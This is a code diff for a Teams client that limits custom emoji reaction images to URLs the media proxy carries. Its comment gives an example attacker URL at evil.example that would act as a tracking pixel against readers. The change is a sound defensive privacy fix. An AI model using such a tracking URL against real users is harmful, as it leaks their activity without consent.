@@ -13,6 +13,7 @@
 //     (`teamsReactionKey`), or the reaction would be meaningless to every other
 //     Teams client.
 
+import { mediaNeedsProxy } from "./protocol";
 import { TEAMS_EMOJI_CATALOG } from "./teams-emoji-catalog";
 
 /** Shown for a key no catalog entry, tone rule, or code point can explain — a
@@ -224,9 +225,17 @@ const CUSTOM_REACTION_PREFIX = "tlcustom-";
  * There is no key MINTED here on purpose. The URL names an AMS object that does not
  * exist until the backend has uploaded the art, so the page names the emoji and the
  * backend mints the key (`react` takes `emoji` for that).
+ *
+ * The URL must be one the media PROXY would carry, and that is a privacy rail rather
+ * than a tidiness one. An emotion key is written by whoever reacted — Teams accepts an
+ * arbitrary 289-character one, measured in examples/custom_emoji_reaction_probe.rs — so
+ * a colleague could react with `tlcustom-https://evil.example/p.png?who=…` and every
+ * reader's browser would fetch it as the bubble drew, which is the tracking pixel this
+ * app strips out of a mail body. A Teams-hosted URL goes through the backend instead,
+ * and anything else is not art we draw.
  */
 export function customReactionArt(key: string): { src: string } | null {
   if (!key.startsWith(CUSTOM_REACTION_PREFIX)) return null;
   const src = key.slice(CUSTOM_REACTION_PREFIX.length);
-  return src.startsWith("https://") ? { src } : null;
+  return src.startsWith("https://") && mediaNeedsProxy(src) ? { src } : null;
 }
